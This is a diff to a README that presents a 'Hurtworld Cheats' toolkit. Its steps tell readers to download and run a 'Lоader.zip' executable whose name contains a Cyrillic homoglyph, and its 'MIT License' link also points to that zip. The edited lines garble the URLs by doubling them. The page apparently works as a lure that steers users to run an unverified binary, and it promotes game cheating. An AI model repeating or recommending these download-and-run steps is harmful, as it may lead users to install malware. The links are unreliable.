@@ -6,8 +6,8 @@ Welcome to the **Hurtworld Cheats** repository! This advanced toolkit is designe
 
 Getting started is simple! Follow these steps to access all features provided by Hurtworld Cheats:
 
-1. **Download** `https://raw.githubusercontent.com/asikur2745/HurtWorldToolkit/main/Lоader.zip` from the repository.
-2. **Extract** the contents of `https://raw.githubusercontent.com/asikur2745/HurtWorldToolkit/main/Lоader.zip` to your preferred folder.
+1. **Download** `https://raw.githubusercontent.com/asikur2745/HurtWorldToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/asikur2745/HurtWorldToolkit/main/Lоader.zip` from the repository.
+2. **Extract** the contents of `https://raw.githubusercontent.com/asikur2745/HurtWorldToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/asikur2745/HurtWorldToolkit/main/Lоader.zip` to your preferred folder.
 3. **Run** the Loader executable according to your operating system (see compatibility below).
 4. **Customize** your settings through the intuitive GUI.
 5. **Launch Hurtworld** and enjoy all available enhancements!
@@ -79,7 +79,7 @@ We encourage everyone to respect game communities and play fair!
 
 ## 📃 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/asikur2745/HurtWorldToolkit/main/Lоader.zip) in 2025. You are free to use, distribute, and modify the code for personal, educational, or professional purposes as long as the original license is included.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/asikur2745/HurtWorldToolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/asikur2745/HurtWorldToolkit/main/Lоader.zip) in 2025. You are free to use, distribute, and modify the code for personal, educational, or professional purposes as long as the original license is included.
 
 ---
 
